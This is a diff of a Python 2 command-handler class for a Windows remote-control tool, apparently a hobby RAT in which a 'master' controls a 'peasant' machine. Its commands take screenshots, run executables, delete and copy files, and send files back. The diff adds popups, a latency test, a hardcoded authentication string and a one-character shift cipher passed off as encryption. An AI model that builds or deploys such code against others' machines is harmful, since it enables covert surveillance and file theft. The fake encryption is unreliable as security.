@@ -1,5 +1,5 @@
 # Tal's Commands Class
-# Version 6 - 14.2.19
+# Version 7 - 1.6.19
 
 import os
 import subprocess
@@ -7,6 +7,8 @@ from shutil import copy
 from PIL import ImageGrab
 import win32com.client as cl
 import sys
+import ctypes
+from datetime import datetime
 
 
 class Commands(object):
@@ -24,7 +26,9 @@ class Commands(object):
                 'Copy File': (Commands.__copy_request, Commands.__print_response, ['Source', 'Destination']),
                 'Execute': (Commands.__execute_request, Commands.__print_response, ['Executable File']),
                 'Text To Speech': (Commands.__text_to_speech_request, Commands.__print_response, ['The Text To Say']),
-                'Disconnect': (Commands.__disconnect_request, Commands.__print_response, [])}
+                'Popup Text Box': (Commands.__popup_request, Commands.__print_response, ['Text']),
+                'Speed Test': (Commands.__speed_test_request, Commands.__speed_test_response, [])}
+#                'Disconnect': (Commands.__disconnect_request, Commands.__print_response, [])}
 
     """-----------------THE CONSTS-----------------"""
     # the number of digits the length of the messages sending
@@ -41,6 +45,10 @@ class Commands(object):
     __REQUEST_INDEX = 0
     __RESPONSE_INDEX = 1
     __PARAM_INDEX = 2
+    # the global time
+    __epoch = datetime.utcfromtimestamp(0)
+
+    __hash = r"""Bc33Kxx4s87tjAPnn9gerawp23ZstZLG5mbAjvVTz2emyXmUTePeEP5EKPd6PRm4sEz8zCPrPfEJteSPgsbeH2HgCQfBuX2dayNXW3ymUx79TPCtmx6jPdHHX7mXbxWbzBk8xQNwNcfryn4uZn22q2963RKgHsMxkEgvZ5XJ2rHCCb7m7Trjs33echNz2KF9MUyEWrEwqbbfv84aeWWtaDM62C4CWPKNSAua7YeQT5hfPRLR5xEkqTa4zW2krC2x"""
 
     """-----------------COMMANDS REQUESTS HANDLERS-----------------"""
 
@@ -69,10 +77,10 @@ class Commands(object):
     def __copy_request(src, dest):
         # if file doesn't exist, return SystemError
         if not os.path.exists(src):
-            return SystemError("%s Doesn't Exist" % src)
+            return SystemError("%s Doesn't Exist." % src)
         # if the file's name isn't a file, return SystemError
         if not os.path.isfile(src):
-            return SystemError("%s Isn't A File" % src)
+            return SystemError("%s Isn't A File." % src)
         copy(src, dest)
         return 'Copied %s to %s' % (str(src), str(dest))
 
@@ -80,10 +88,12 @@ class Commands(object):
     def __execute_request(to_execute):
         # if file doesn't exist, return SystemError
         if not os.path.exists(to_execute):
-            return SystemError("%s Doesn't Exist" % to_execute)
+            return SystemError("%s Doesn't Exist." % to_execute)
         # if the file's name isn't a file, return SystemError
         if not os.path.isfile(to_execute):
-            return SystemError("%s Isn't A File" % to_execute)
+            return SystemError("%s Isn't A File." % to_execute)
+        if not to_execute[-4:] == '.exe':
+            return SystemError("%s Isn't An Executable." % to_execute)
         subprocess.call(to_execute)
         return 'Executed %s' % str(to_execute)
 
@@ -96,7 +106,10 @@ class Commands(object):
         return 'Deleted %s' % str(to_delete)
 
     @staticmethod
-    def __dir_request(directory):
+    def __dir_request(directory=""):
+        # if the directory  is empty, set it to be the current working directory
+        if directory == "":
+            directory = os.getcwd()
         # if directory doesn't exist, return SystemError
         if not os.path.exists(directory):
             return SystemError("%s Doesn't Exist." % directory)
@@ -113,10 +126,10 @@ class Commands(object):
     def __send_file_request(file_name):
         # if file doesn't exist, return SystemError
         if not os.path.exists(file_name):
-            return SystemError("%s Doesn't Exist" % file_name)
+            return SystemError("%s Doesn't Exist." % file_name)
         # if the file's name isn't a file, return SystemError
         if not os.path.isfile(file_name):
-            return SystemError("%s Isn't A File" % file_name)
+            return SystemError("%s Isn't A File." % file_name)
         # get the file's data as binary data
         with open(file_name, "rb") as f:
             data = f.read()
@@ -138,8 +151,20 @@ class Commands(object):
         return 'Bye bye'
 
     @staticmethod
+    def __popup_request(text):
+        pressed = 'Ok' if ctypes.windll.user32.MessageBoxA(0, text, "PopUp", 1) == 1 else 'Cancel'
+        return 'Opened a popup text box with the text: "%s". Peasant Pressed %s.' % (text, pressed)
+
+    @staticmethod
+    def __speed_test_request(time):
+        return time
+
+    @staticmethod
     def __print_response(response):
-        return str(response)
+        response = str(response)
+        if response[-1] != '.':
+            response += '.'
+        return response
 
     @staticmethod
     def __send_file_response(typ, *data):
@@ -150,6 +175,12 @@ class Commands(object):
         with open(filename, 'wb') as f:
             f.write(Commands.SEPARATE_CHAR.join(data))
         return "Saved at '" + os.getcwd() + "\\" + filename + "'"
+
+    @staticmethod
+    def __speed_test_response(time):
+        # calculate the time between sending
+        delta = abs((Commands.__current_time_milli() - float(time)) / 2)
+        return "The Time Between The Master And The Peasant Is %f Milliseconds" % delta
 
     """-----------------COMMANDS RELATED PUBLIC FUNCTIONS-----------------"""
 
@@ -182,20 +213,22 @@ class Commands(object):
         commands = Commands.__commands()
         # get the handle request function
         handle_request_function = commands[commands.keys()[command_number]][Commands.__REQUEST_INDEX]
-        # set the default response to not enough parameters
-        response = "ERROR: Not Enough Parameters With %s Command" % commands.keys()[command_number]
-        # try to execute the request adn return it's result
+        # try to execute the request and set the response to it's result value
         try:
-            return handle_request_function(*args)
+            return str(handle_request_function(*args))
         # if not enough parameters
         except TypeError as e:
             # notify the master about how many parameters were given, and how many needed
-            nums = [int(s) for s in e.message if s.isdigit()]
-            return "ERROR: %s Command Got %d Parameters. Expected %d." %\
-                   (commands.keys()[command_number], nums[0], nums[1])
+            nums = [int(s) for s in str(e.message) if s.isdigit()]
+            return str("ERROR: %s Command Got %d Parameters. Expected %d." %
+                       (commands.keys()[command_number], nums[0], nums[1]))
+        # if other problem has occurred
         except SystemError as e:
-            # return the response
-            return "ERROR: In %s Command: %s" % (commands.keys()[command_number], e.message)
+            # notify the master
+            return str("ERROR: In %s Command: %s" % (commands.keys()[command_number], str(e.message)))
+        except ValueError as e:
+            # notify the master
+            return str("ERROR: In %s Command: %s" % (commands.keys()[command_number], str(e.message)))
 
     @staticmethod
     def handle_command_response(command_number, args):
@@ -220,6 +253,12 @@ class Commands(object):
             return []
         return commands[command_name][Commands.__PARAM_INDEX]
 
+    @staticmethod
+    def add_params(command_number):
+        if command_number == Commands.command_number('Speed Test'):
+            return [Commands.__current_time_milli()]
+        return []
+
     """-----------------HELPER PUBLIC FUNCTIONS-----------------"""
 
     @staticmethod
@@ -232,3 +271,31 @@ class Commands(object):
         while len(length) < Commands.SIZE_LENGTH:
             length = "0" + length
         return length
+
+    @staticmethod
+    def hash_func():
+        return Commands.__hash
+
+    @staticmethod
+    def check_hash(hashed):
+        return Commands.__hash == hashed
+
+    @staticmethod
+    def encrypt(data):
+        encrypted = ''
+        for c in data:
+            encrypted += chr((ord(c) + 1) % 256)
+        return encrypted
+
+    @staticmethod
+    def decrypt(encrypted):
+        decrypted = ''
+        for c in encrypted:
+            decrypted += chr((ord(c) - 1) % 256)
+        return decrypted
+
+    """----------------------------------------------------------"""
+
+    @staticmethod
+    def __current_time_milli():
+        return (datetime.now() - Commands.__epoch).total_seconds() * 1000.0
